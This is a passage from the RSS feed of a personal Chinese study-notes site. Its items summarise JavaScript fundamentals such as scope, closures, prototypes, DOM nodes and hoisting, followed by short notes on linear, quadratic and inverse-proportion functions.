      <title>JavaScript Window</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/window/window/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/window/window/</guid>
      <description>Window Window 对象表示一个包含 DOM 文档的窗口，其 document 属性指向窗口中载入的 DOM 文档 。
如果文档包含框架（frame 或 iframe 标签），浏览器会为 HTML 文档创建一个 window 对象，并为每个框架创建一个额外的 window 对象。</description>
    </item>
    
    <item>
      <title>JavaScript 作用域</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E4%BD%9C%E7%94%A8%E5%9F%9F/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E4%BD%9C%E7%94%A8%E5%9F%9F/</guid>
      <description>作用域 作用域（scope）定义了代码在运行时的某些特定的变量、函数、对象的可调用范围。
每个函数都会创建 scope（作用域对象），scope 中储存是一个个的全局作用域与局部作用域），即 scope 中存储的是作用域的集合（作用域链）。
父函数不能调用子函数的变量 当调用一个变量时，调用者会去作用域链（scope）的顶端依次向下寻找这个变量；又因为子函数的 AO 中含有父函数 AO 的引用地址，所以子函数可以调用父函数的变量；反之，因为父函数的 AO 不能含有子函数 AO 的引用，所以父函数不能调用子函数的变量。
作用域都是独立的 声明多个同级函数时，这些函数的作用域链都是独立的，即每个同级函数中的局部变量不可以公用，但它们都可以使用全局中的变量；这些作用域链会随着对应函数的执行完毕而依次释放。
全局作用域 在全局作用域（GO 对象）中的变量为全局变量，全局变量的的作用域为整个脚本，这类变量在脚本中的任何地方（包括函数内部）能被调用。
它们通常指在全局中定义的变量或没有使用 var 声明的暗示全局变量。
这些变量都在全局作用域中：  函数外声明的变量。 函数中没有使用 var 声明的变量。  局部作用域 局部作用域（AO 对象）中的变量为局部变量，局部变量的作用域仅限于某个特定的函数，这类变量可以在特定的函数中调用。
每个函数内部都会创建一个局部作用域，当一个函数（父函数）中包含另一个函数（子函数），则父函数不能调用子函数的变量，但子函数可以调用父函数的变量；并且两个独立且同级的函数中的局部变量不能公用，只能各用各的局部变量。
这些变量都在局部作用域中：  它们通常指在函数中定义的变量或函数的形式参数。 函数中使用 var 声明的变量。 函数中的形式参数。  累加器 function One() { 	var b = 0; 	function Two() { 	b++; 	console.log(b); 	} 	a = Two; 	// 变量 a 是一个暗示全局变量，用变量 a 接收函数 Two } One(); //调用函数 One，使暗示全局变量 a 可以执行 a(); // 执行变量 a，相当于执行函数 Two，每执行一次变量 a，就会使 b 在原来的的结果上自增一次。 a(); a(); 作用域链 function One() { 	// 声明函数 One 时，系统会隐式创建 One.</description>
    </item>
    
    <item>
      <title>JavaScript 函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</guid>
      <description>函数 函数又叫方法，它是用来执行某些特定功能的代码；且允许我们在程序中随时进行调用。
每一个函数其实都是一个 Function 类型的对象。
函数中若没有使用 return 语句，则它默认返回 undefined；要想返回一个指定的值，则需使用 return 语句来指定一个返回值（使用 new 关键字调用一个构造函数除外）。
基本方式 直接通过 function 关键字进行声明。
function demo(a, b) { 	// 声明一个函数，demo 为函数名，a 与 b为形式参数（形参）。 	console.log(a + b); 	// 返回形参 a 与 b 的和 3。 } demo(1, 2); // 使用执行符 () 调用函数 demo，1 与 2 为实际参数（实参） var c = demo.name; // 函数 demo 的属性 name 为指定函数的（这里为 demo）名字， // 该属性的值永远等于跟在 function 关键字后面的标识符（变量名），匿名函数的属性 name 为空。 console.log(c); // 返回函数 demo 的函数名  //匿名函数方式-------------------------------------------------- var demo = function () { 	console.</description>
    </item>
    
    <item>
      <title>JavaScript 函数参数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0/</guid>
      <description>函数参数 形参 指在定义函数时使用的参数，用于接收调用该函数时传入的实参。
在调用函数时，实参将赋值给形参；因而，必须使实参的个数与类型应与形参一一的对应，且传入的实参必须要有确定的值。若为给形参传入对应的实参，那么该形参默认为undefined。
实参 调用函数时传递给函数的参数，一般与实参一一对应。
变量传值 指的是将一个变量的值赋给另外一个变量。
值传递 将一个变量的值复制一份， 然后将新的值赋给另外一个变量（两个变量没有关系）。
引用传递 将一个变量的值的内存地址，传递给另外一个变量，两个变量的内存地址所指向的是同一块内存空间（两个变量所指向的都是同一个值，他们互相影响，其中一个变量被改变，另一个也会跟着被改变）。
形参默认值 定义函数的同时可以给形参赋默认值，当我们调用该函数时，若未给形参传入对应的实参，那么这个默认值会被当作该函数的实参。
形参默认值一般设置在形参末尾。
function fun(a = 1, b = 2, c = 3) { 	console.log(a, b, c); }  fun(10, 20); rest rest 中包含了没有对应形参的实参，或者说多余的实参。
rest 只包含那些没有对应形参的实参，而 arguments 对象包含了传给函数的所有实参。
rest 是一个真数组，而不是一个类数组。
rest 必须放到形参末尾。</description>
    </item>
    
    <item>
      <title>JavaScript 分支与循环</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%88%86%E6%94%AF%E4%B8%8E%E5%BE%AA%E7%8E%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%88%86%E6%94%AF%E4%B8%8E%E5%BE%AA%E7%8E%AF/</guid>
      <description>分支与循环 为什么 if 语句中不能进行函数声明 因为程序执行时，程序会在本页代码之内寻找函数声明，并进行函数声明提升，而不会去查找需要条件的 if 之内的内容，
另外，可以用函数表达式定义函数？</description>
    </item>
    
    <item>
      <title>JavaScript 包装类</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%8C%85%E8%A3%85%E7%B1%BB/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%8C%85%E8%A3%85%E7%B1%BB/</guid>
      <description>包装类 在 JavaScript 中，因为原始值不能有属性和方法，所以当给原始值添加属性与方法时，系统会自动且隐式的将原始类型的数据转换为对象，然后再调用这个对象的属性和方法，调用完以后，在将其转换为原始值，这个过程叫做包装类。
因为 undefined 与 null 不能有属性，所以它们不能进行包装类。
Number 将原始类型的数值，转换为 Number 对象，它的原型是 Number.prototyp。
数字类型的对象可以进行学运算，但运算的结果，这个对象会变回原始类型的数值。
String 将原始类型的字符串，转换为 String 对象，它的原型是 String.prototyp。
当原始值字符串直接调用属性 length 时，系统会对这个原始值字符串进行包装类，使之变为对象字符串，又因为字符串对象自带属性 length，因此系统不会将这个属性 delete 删掉，所以最终将属性 length 的值返回。
Boolean 将原始类型的布尔值，转换为 boolean 对象，它的原型是 Boolean.prototyp。
注意 因为 Number、String、boolean 它们本身重写了（用一个同名不同功能的方法覆盖系统自带的方法）一个 xxx.prototype.toString 方法，所以它们不会用原型上 Object.prototype 的 toString 方法。
var a = new Number(123); var b = new String(&amp;#39;yxz&amp;#39;); var c = new Boolean(&amp;#39;true&amp;#39;); console.log(typeof a); console.log(typeof b); console.log(typeof c); // 返回三个 object 数值包装类运算 var num = new Number(123); //原始值 num 被进行包装类，因此它变成了 对象 123。 console.</description>
    </item>
    
    <item>
      <title>JavaScript 区分对象与数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%8C%BA%E5%88%86%E5%AF%B9%E8%B1%A1%E4%B8%8E%E6%95%B0%E7%BB%84/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%8C%BA%E5%88%86%E5%AF%B9%E8%B1%A1%E4%B8%8E%E6%95%B0%E7%BB%84/</guid>
      <description>区分对象与数组 Constructor var arr = []; var obj = {}; var a = arr.constructor; console.log(a); // 返回数组。 var b = obj.constructor; console.log(b); // 返回对象。 Instanceof var arr = [];  var obj = {};  var a = arr instanceof Array; console.log(a); // 返回 true，因为变量 arr 是一个数组。 var a = arr instanceof Object; console.log(a); // 返回 true，因为变量 arr 是一个数组类对象。 var b = obj instanceof Array; console.log(b); // 返回 flase，因为变量 obj 不是一个数组。 var b = obj instanceof Object; console.</description>
    </item>
    
    <item>
      <title>JavaScript 原型</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B/</guid>
      <description>原型 原型对象，它是只有函数才拥有的隐式属性（使用 null 作为构造函数的原型的情况下，原型不能通过自定义进行添加）
通过原型对象这种机制，可以使一个对象从其他的对象那里继承一属性或方法。
prototype 显式原型属性，每一个对象都有一个 prototype，这个属性指向该对象的原型对象。
它和proto指向的都是同一个原型对象。
我们一般通过prototype去操作一个对象的原型对象。而系统调用的时候，会通过proto去调用。
__proto__  隐式原型属性，每一个对象都有一个proto，这个属性指向该对象的原型对象。 proto 的指向（值）可以修改，即一个用构造函数创建出的对象实例的原型是可以通过该属性修改的。 当调用一个对象的属性时，如果这个对象没有这个属性，那么就会到构造该对象的构造函数的原型所指向的对象（可以称之为父对象）中去寻找这个属性，如果父对象也没有这个属性，则到该父对象的构造函数的原型所指向的对象（可以称之为为爷爷对象）里去寻找这个属性，如果还没找到，则继续往上找…，直到原型链终端为 Object.prototype；Object.prototype 中有一个 null，相当于到 null 中去取值，即调用一个对象所没有的值，会返回 undefined；这种通过属性 proto 连接原型对象直到 Object.prototype（null）的一条链为原型链。 通常情况，大部分对象最终都会继承自 Object.prototype，因为 Object.create() 方法中可以将 null 放进去当做原型。 在 JavaScript 中，null 与 undefined 没有原型且不是对象。  作用 可以让一个构造函数所创建的多个对象都可以使用公用的属性和方法。
声明一个构造函数之后，该构造函数中会有一个属性 prototype，这个属性指向的就是该构造函数对应的原型对象。
原型对象中有一个属性 constructor，该属性用于指向这个对象的构造函数。
// Demo.prototype = {} 是构造函数 Demo 的原型，它默认是一个空对象（原型对象） // 当构造函数 Demo 被定义完成时，同时该函的原型对象 Demo.prototype = {} 也被定义完成； // Demo.prototype.name = &amp;#34;原型的名字&amp;#34;; // Demo.prototype.size = &amp;#34;500&amp;#34;; // Demo.prototype.height = &amp;#34;1400&amp;#34;; // Demo.</description>
    </item>
    
    <item>
      <title>JavaScript 原型链</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B%E9%93%BE/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E5%8E%9F%E5%9E%8B%E9%93%BE/</guid>
      <description>原型链 每个实例对象（ object ）都有一个私有属性（ proto ），用于指向它的构造函数的原型对象（prototype）；该原型对象也有一个自己的私有属性（proto ），层层向上直到原型对象 Object.prototype 为 null；而 null 没有原型，它作为这个原型链的终端，它的值为 undefined。
几乎所有 JavaScript 中的对象都是位于原型链顶端的 Object 的实例。
可以使用对象的属性 proto 实现继承。</description>
    </item>
    
    <item>
      <title>JavaScript 命名空间</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</guid>
      <description>命名空间 命名空间（package），它可以帮助我们更好地整理代码，并可避免变量命名冲突。
简单地说，我们可以创建一个简单对象字面量来打包所有的相关函数和变量。这个简单对象字面量模拟了命名空间的作用。
作用 私有化变量 function Demo() { 	var healthy = 0; 	// 该变量为私有化变量，这个变量只能通过构造函数的指定方法进行调用， 	// 不能直接作为对象的属性或变量进行调用。 	this.cure = function () { 	healthy++; 	};  	this.injured = function () { 	healthy--; 	};  	this.view = function () { 	console.log(healthy); 	}; }  var demo = new Demo();  demo.view(); // 返回 0，调用构造函数的属性 view。 demo.cure(); // 调用构造函数的属性 cure。，使变量 healthy 自增 1。 demo.</description>
    </item>
    
    <item>
      <title>JavaScript 属性调用</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%B1%9E%E6%80%A7%E8%B0%83%E7%94%A8/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%B1%9E%E6%80%A7%E8%B0%83%E7%94%A8/</guid>
      <description>属性调用 通常调用属性的格式一般为 fun.arr，实际上系统会隐式将 fun.arr 变为 fun[&amp;ldquo;arr&amp;rdquo;]，因为前者调用更加灵活且简洁。
var demo = { 	wife1: { name: &amp;#39;lei&amp;#39; }, 	wife2: { name: &amp;#39;zheng&amp;#39; }, 	wife3: { name: &amp;#39;xing&amp;#39; }, 	wife4: { name: &amp;#39;zhu&amp;#39; }, 	fun: function (num) { 	var a = [&amp;#39;wife&amp;#39; + num]; 	console.log(a); 	return this[&amp;#39;wife&amp;#39; + num]; 	// 看不太懂 	}, };  demo.fun(1); demo.fun(2); demo.fun(3); demo.fun(4); </description>
    </item>
    
    <item>
      <title>JavaScript 开发原则</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%80%E5%8F%91%E5%8E%9F%E5%88%99/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%BC%80%E5%8F%91%E5%8E%9F%E5%88%99/</guid>
      <description>开发原则 渐进增强 不要使用 JavaScript 代码添加网页的核心内容，应该先保证核心内容脱离与 CSS 与 JavaScript 代码之外。
平稳退化 确保网页在没有 JavaScript 与 CSS 的情况下也能使用核心功能，而且渐进增强的实现必然支持平稳退化。
向后兼容 使用对象检测的方式来检测浏览器对 JavaScript 的支持程度，确保老版本的浏览器不会因为不支持某些 JavaScript 代码而报错。
性能考虑 减少访问 DOM 的和文档中标记的元素；过多的页面元素只会增大 DOM 树的规模。
将多个 JavaScript 文件合并为一个；减少加载页面时发送的请求数量。
压缩已完成的 JavaScript 脚本；将文件中的不必要的字节（空格、注释、回车符）统统删除，从而减少整体文件大小。</description>
    </item>
    
    <item>
      <title>JavaScript 数据类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>原始值和引用值 在 ECMAScript 中，数据类型有两种，即原始类型和引用类型。
原始类型 一种非对象也没有方法和属性的数据类型，也叫基本类型（基本数值或基本数据类型）。所有的原始值都是不可改变的。
Number 数值，用整数或浮点数表示，它允许任意位的小数。
String 字符串，由零个或多个字符构成，它必须被包含在双引号或双引号内。
与数组一样的是，字符串中的每个字符都有一个下标，这些下标从 0 开始。因此，它有属性 length。
Boolean 布尔，表示一个逻辑值，只有 true 或 false 两个值。
BigInt 任何精度格式的整数，是一种比 Number 数据类型支持的范围更大的整数值。用于安全地存储和操作大整数。
Symbol 符号，它是唯一的并且是不可修改的。
undefined 未定义，它只有一个值 undefined，指一个声明未描述的变量的初始值或一个变量直接赋值为 undefined，或没有实际参数的形式参数
Null 空指针，它也只有一个值 null，表示一个不存在的或无效 object 和地址引用。因为历史遗留性问题，它是的数据类型为 Object。
原始值的储存原理 a = 10; // 在栈内存第一层创建一个变量 a ，然后将数值 10 放进变量 a 中。 // 栈内存： // a ： 10 var b = a; // 在栈内存第二层创建一个变量 b，然后将变量 a 中的数值 10 拷贝到变量 b 中。 // 栈内存： // a ：10 // 拷贝变量 10 // b ：10 a = 20; // 在栈内存第三层重新创建一个变量 a，然后将数值 10 放入这个第三层的变量 a 中，之后关闭在第一层的变量 a。 // 栈内存： // a ：10（已关闭） // b ：10 // a ：20 （新的变量 a） 引用类型 引用类型都是对象，每个对象都有属性和方法。它指的是存储在堆内存中的实际对象。每一个引用变量中都存放着指针，这个指针指向其堆内存中的实际对象。</description>
    </item>
    
    <item>
      <title>JavaScript 继承方式</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E7%BB%A7%E6%89%BF%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/</guid>
      <description>继承方式 原型链继承 缺点
会使一个对象过多继承一些没用或不需要的属性，则会导致代码的执行效率大大降低。反对反对反对法大幅度发反对发的
Grand.prototype.blue = &amp;#39;blue&amp;#39;;  function Grand() {}  var grandfather = new Grand();  Father.prototype = grandfather;  function Father() { 	this.red = &amp;#39;red&amp;#39;; 	this.money = { 	card: &amp;#39;pencil&amp;#39;, 	}; 	this.value = &amp;#39;100&amp;#39;; }  var father = new Father();  Son.prototype = father;  function Son() { 	this.orange = &amp;#39;orange&amp;#39;; } var son = new Son();  console.log(son.orange);  // 返回 son 的原型 father 上的 red。 console.</description>
    </item>
    
    <item>
      <title>JavaScript 节点</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E8%8A%82%E7%82%B9/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/%E8%8A%82%E7%82%B9/</guid>
      <description>节点 在文档中，几乎每一样东西都是一个节点（Node），包括空格和换行符都会被解释为节点。
文档的根节点不是 html，而是 document。
分类 元素节点 文档中的元素，nodeType 的值为 1。
属性节点 文档中元素节点的属性，属性节点都被包含在元素节点中。
nodeType 的值为 2。
文本节点 文档中元素所包含的文本。 nodeType 的值为 3。
注释节点 文档中的注释。
nodeType 的值为 8.
document 节点 nodeType 的值为 9。
属性 每一个节点都有四个基本属性。
nodeValue 返回或设置指定点的值。
只用文本节点或注释节点才有 nodeValue。
而其他节点的 nodeValue 是 null 。
nodeName 返回指定节点的大写字母形式的节点名，它是一个只读属性。
nodeType 返回指定节点的类型，只读属性。
元素节点返回 1。
属性节点返回 2。
文本节点返回 3。
注释节点返回 8。
document 节点返回 9。
attributes 返回指定节点的所有属性节点。
方法 hasChildNodes() 判断一个元素是否包含子节点，返回一个布尔值。</description>
    </item>
    
    <item>
      <title>JavaScript 运算符</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%BF%90%E7%AE%97%E7%AC%A6/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%BF%90%E7%AE%97%E7%AC%A6/</guid>
      <description>运算符 算数运算符 算术运算符都会将操作数用 Number() 隐式转换，然后再进行运算；若遇到无法转换的值，则会返回 number 类型的 NaN。
++ a++ 或 ++a，自增（递增）。使操作数加 1，并返回自增后的值。
操作数前置或后置
若位于数值的之后（a++），则会自增之前返回数值。
若位于数值的之前（++a），则会自增之后返回数值。
&amp;ndash; a&amp;ndash; 或 &amp;ndash;a， 递减（自减）。使操作数减 1，并返回自减后的值。
操作数前置或后置
若位于数值的之后（a&amp;ndash;），则会递减之前返回数值。
若位于数值的之前（&amp;ndash;a），则会递减之后返回数值。
比较运算符 JavaScript 有两种比较方式：严格比较和转换类型比较。
对于严格比较运算符（===）来说，仅当两个操作数的类型相同且值相等为 true。
对于比较运算符（==）来说，会先将将两个操作数转换成相同的类型，再进行值的比较运算。
对于关系运算符（ &amp;lt;=）来说，会先将操作数转为原始值，使它们类型相同，再进行值的比较运算。
字符串比较则是使用基于标准字典的 Unicode 值来进行比较的。
原始值比较的是值，引用值比较的是引用地址。
In 用于判断一个对象的指定的属性是否在该对象或其原型链中，在则 in 运算符返回 true，不在则返回 false。
Instanceof 用于判断一个对象是否是由指定构造函数构造出来的。
// 如果 mycar 不是 vue 的实例对象 if (!(mycar instanceof Car)) { 	console.log(&amp;#39;No&amp;#39;); } 也可以用于判断一个实例对象的原型链中有没有另一个变量的原型。
function Car(make, model, year) { 	this.make = make; 	this.</description>
    </item>
    
    <item>
      <title>JavaScript 链式调用</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E9%93%BE%E5%BC%8F%E8%B0%83%E7%94%A8/</guid>
      <description>链式调用 模仿一个 jQuery 链式调用的方式。
var demo = { 	a: function () { 	console.log(123); 	return this; 	// 将函数自身返回。 	},  	b: function () { 	console.log(456); 	return this; 	// 将函数自身返回。 	},  	c: function () { 	console.log(789); 	return this; 	//将函数自身返回。 	}, }; demo.a().b().c(); // 呈链式(连续)的调用对象 demo 的属性。 </description>
    </item>
    
    <item>
      <title>JavaScript 闭包</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E9%97%AD%E5%8C%85/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E9%97%AD%E5%8C%85/</guid>
      <description>闭包 在函数（父函数）中创建另一个函数（子函数）时；当子函数被父函数 return 到了外部时，会生成闭包。
生成了闭包后，虽然父函数的 AO 已经被释放了，但子函数却保存了父函数的 AO，且这个 AO 不会因为父函数的执行完毕而被释放，因为父函数的 AO 已经被子函数给保存了起来，且可以随意调用。
闭包的优缺点 优点 避免全局变量的污染。
使变量长期储存在内存中。
缺点 使用不当会导致原有的作用域链不释放，造成内存泄露（过多占用内存的剩余空间，导致可用空间越来越少）。
function demo() { 	function test() { 	var d = 345; 	console.log(c); 	// 虽然函数 test 中没有变量 c，但因为函数 test 可以使用函数 demo 的 AO， 	// 所以它会到函数 demo 的作用域中去寻找变量 c，然后返回 123 	} 	var c = 123; 	return test; 	// 将函数 test 返回，即将函数 test 与它的作用域一起保存到了外部， 	// 使的函数 demo 可以使用函数 test 的 AO } var e = demo(); // 用变量 e 接收函数 demo 的返回值，也就是接收函数 test 以及它的 AO e(); // 调用变量 e，即相当于执行函数 demo 的返回值 // 父函数 demo 执行完毕后，释放了自己的 AO，但子函数 test 在这之前已经将父函数 demo 的 AO 保存了起来， // 所以它会到函数 demo 的作用域中去寻找变量 c，然后返回 123 function demo() { 	var b = &amp;#39;apple&amp;#39;; 	var obj = { 	c: function () { 	// 给对象 obj 添加一个属性 c ，属性值为一个函数 	if (b !</description>
    </item>
    
    <item>
      <title>JavaScript 预编译</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E9%A2%84%E7%BC%96%E8%AF%91/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E9%A2%84%E7%BC%96%E8%AF%91/</guid>
      <description>预编译 JavaScript 是脚本语言，因此不会进行传统的预编译，但它会经过一个特殊的预编译过程，这个预编译过程发生在代码执行前的极短时间内。
预编译发生在代码执行之前的一瞬间，用于在内存中创建一些空间来存储一些变量与函数；预编译时，会无视 if 语句中的条件，会直接将 if 语句中的代码块内的变量的声明与函数声明进行提升。
函数声明提升 定义一个函数时，该函数会被提升到当前作用域链的顶端，即调用该函数时，不管在哪调用该函数，都可以调用成功；但函数表达式并不会。
变量声明提升 使用 var 声明的变量，不管在这之前还是之后调用该变量，并不会报错，会返回 undefined。
暗示全局变量 暗示全局变量（imply global），一个变量未声明就赋值，那么此变量就是 window（全局对象）的属性； 任何全局变量，都是 window 的属性，即可以通过 window 对象调用全局变量。window 就是全局的域，它包括了全局变量和全局函数。
暗示全局变量不会进行变量声明提升。
a = 10; // 一个变量未声明就赋值，那么此变量就是 window（全局对象）的属性，也叫暗示全局变量 // 相当于 window.a = 10; // 相当于 window = { 	a: 10, };  //一切声明了的全局变量，都是 window 的属性 var b = 20; // 相当于 window.b = 20; // 相当于 window = { 	b: 20, }; // 调用变量 b，相当于调用全局对象 window 的属性 b，即 console.</description>
    </item>
    
    <item>
      <title>Math 一次函数</title>
      <link>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/</guid>
      <description>一次函数 解析式 $ y = kx + b$（$k$ 与 $b$ 为常数 $k \neq 0$），当 $b$ 等于 $0$ 时，这个函数为正比例函数。
图像  一次函数的图像都是一条直线，因此只需要两点就可以画出。 $ y = kx + b$ 的图像可以由 $y = kx$ 向上或向下平移 |b| 个单位得到，当 $b$ 大于 0 则向上；小于 0 则向下。  与方程、不等式的关系  因为任何一个一元一次方程都可以变为 $ax + b = 0$ 的形式，所以解这个一元一次方程，相当于求与这个一元一次方程对应的 $y = ax + b$ 的函数值为 $0$ 时，自变量 $x$ 的值；例如： $3x + 5 = 6 =&amp;gt; 3x + 5 - 6$。 每个一含有 $x$ 和 $y$ 的二元一次方程都对应一个一次函数，同样也对应一条在坐标系中的直线，因此这条线上的每一个点（$x$，$y$）都是这个二元一次方程的解。 二元一次方程组则对应两个一次函数，同时也对应两条在坐标系中的直线，因此解这个二元一次方程组，相当于找出这两条直线在坐标系中的交点的坐标。  </description>
    </item>
    
    <item>
      <title>Math 二次函数</title>
      <link>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E4%BA%8C%E6%AC%A1%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E4%BA%8C%E6%AC%A1%E5%87%BD%E6%95%B0/</guid>
      <description>二次函数 解析式 一般式：$y = ax^2 + bx + c$
顶点式：$y = a(x - h)^2 + k$
从 $y = ax^2$ 的图像可以看出  当 $a &amp;gt; 0$ 时，开口向上；当 $a &amp;lt; 0$ 时，开口向下，$|a|$越大，则图像的开口越小。 如果 $a &amp;gt; 0$ ，当 $x &amp;lt; 0$ 时，$y$ 随 $x$ 的增大而减小，当 $x &amp;gt; 0$ 时，$y$ 随 $x$ 的增大而增大；如果 $a &amp;lt; 0$ 时，当 $x &amp;gt; 0$ 时，$y$ 随 $x$ 的增大而减小。  从 $y = ax^2 + k$ 的图像可以看出 当 $k &amp;gt; 0$ 时，图像向上平移 $k$ 个单位；当 $k &amp;lt; 0$，图像则向下平移 $|k|$ 个单位长度。</description>
    </item>
    
    <item>
      <title>Math 反比例函数</title>
      <link>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E5%8F%8D%E6%AF%94%E4%BE%8B%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E5%8F%8D%E6%AF%94%E4%BE%8B%E5%87%BD%E6%95%B0/</guid>
      <description>反比例函数 解析式 $y = \frac{k}{x}$
图像 当 $k$ &amp;gt; 0，时，图像位于一、三象限，且 $y$ 随 $x$ 增大而减小。
当 $k$ &amp;lt; 0，时，图像位于二、四象限，且 $y$ 随 $x$ 增大而增大。</description>
    </item>
    
    <item>
      <title>Math 正比例函数</title>
      <link>https://note.yxzi.xyz/note/subject/math/%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0/%E6%AD%A3%E6%AF%94%E4%BE%8B%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
